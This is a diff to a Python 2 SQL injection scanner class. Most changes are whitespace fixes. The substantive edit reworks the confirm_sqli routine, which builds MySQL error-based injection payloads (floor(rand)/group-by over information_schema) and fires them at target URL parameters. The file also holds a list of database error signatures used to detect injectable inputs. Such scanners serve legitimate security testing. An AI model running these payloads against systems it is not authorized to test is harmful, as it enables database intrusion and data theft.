@@ -32,12 +32,13 @@ class classSQL(object):
         self.url = url
         self.to_check_list = []
         self.aim_error_list = []
+        self.confirm_error_list = []
         self.get_value()
-    
+
     def get_value(self, payload=None):
         # to check if the file upload, if uploaded, return directly
         self.to_check_list = []
-        self.aim_error_list = []
+        #self.aim_error_list = []
         if payload is None: payload=classSQL.payload
         if self.method == 'GET':
             _ = urlparse.urlparse(self.url)
@@ -70,15 +71,15 @@ class classSQL(object):
                     else:
                         temp_query = urllib.urlencode(temp_dict)
                         self.to_check_list.append(temp_query)
-            
-        
-        # print "self.to_check_list = {}".format(self.to_check_list)
+
+
+        #print "self.to_check_list = {}".format(self.to_check_list)
 
 
     def search_errormsg(self, response):
         error_msg_plain = [
                     'Microsoft OLE DB Provider for ODBC Drivers',
-                    'Error Executing Database Query',            
+                    'Error Executing Database Query',
                     'Microsoft OLE DB Provider for SQL Server',
                     'ODBC Microsoft Access Driver',
                     'ODBC SQL Server Driver',
@@ -111,7 +112,7 @@ class classSQL(object):
                     'unexpected end of SQL command',
                     'Supplied argument is not a valid PostgreSQL result',
                     'internal error [IBM][CLI Driver][DB2/6000]',
-                    'PostgreSQL query failed',    
+                    'PostgreSQL query failed',
                     'Supplied argument is not a valid PostgreSQL result',
                     'pg_fetch_row() expects parameter 1 to be resource, boolean given in',
                     'unterminated quoted string at or near',
@@ -125,14 +126,14 @@ class classSQL(object):
                     'SQLSTATE=42603',
                     'org.hibernate.exception.SQLGrammarException:',
                     'org.hibernate.QueryException',
-                    'System.Data.SqlClient.SqlException:',	
+                    'System.Data.SqlClient.SqlException:',
                     'SqlException',
                     'SQLite3::SQLException:',
                     'Syntax error or access violation:',
                     'Unclosed quotation mark after the character string',
                     'You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near',
                     'PDOStatement::execute(): SQLSTATE[42601]: Syntax error:',
-                    '<b>SQL error: </b> no such column'            
+                    '<b>SQL error: </b> no such column'
 				]
 
         error_msg_re = [
@@ -172,7 +173,7 @@ class classSQL(object):
                 if re.findall(msg, response):
                     found = True
                     break
-        
+
         return found
 
     def confirm_sqli(self):
@@ -183,8 +184,8 @@ class classSQL(object):
         anchor = ''.join(a[:10])
 
         for d in confirm_data:
-            confirm_value1 = d + ' and(select 1 from(select count(*),concat((select concat(' + anchor + ') from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)and ' + d
-            confirm_value2 = d + '(select 1 and row(1,1)>(select count(*),concat(concat(' + anchor + '),floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))' + d
+            confirm_value1 = d[0] + ' and(select 1 from(select count(*),concat((select concat(' + anchor + ') from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)and ' + d[1]
+            confirm_value2 = d[0] + '(select 1 and row(1,1)>(select count(*),concat(concat(' + anchor + '),floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))' + d[1]
             print confirm_value1
             print confirm_value2
             self.get_value(payload=[confirm_value1, confirm_value2])
@@ -205,11 +206,11 @@ class classSQL(object):
                 except Exception as identifier:
                     pass
 
-            
 
-    
+
+
     def start_test(self):
-        
+
         for url in self.to_check_list:
             try:
                 if self.method == 'GET':
@@ -220,7 +221,7 @@ class classSQL(object):
                     break  # return error
                 else:
                     response = rsp.content
-                
+
                 if self.search_errormsg(response):
                     self.aim_error_list.append((self.method, self.url, url))
                     # to confirm the error like awvs
@@ -234,7 +235,7 @@ def sqli_test(url, headers, data=None):
     :url: the url to detect
     :headers:  header info, type is dict
     :data: if POST request, data is the post data
-    :rtype: classSQL().aim_error_list, a list object which contains the error-based request and payload 
+    :rtype: classSQL().aim_error_list, a list object which contains the error-based request and payload
     """
     a = classSQL(url, headers, data=data)
     a.start_test()
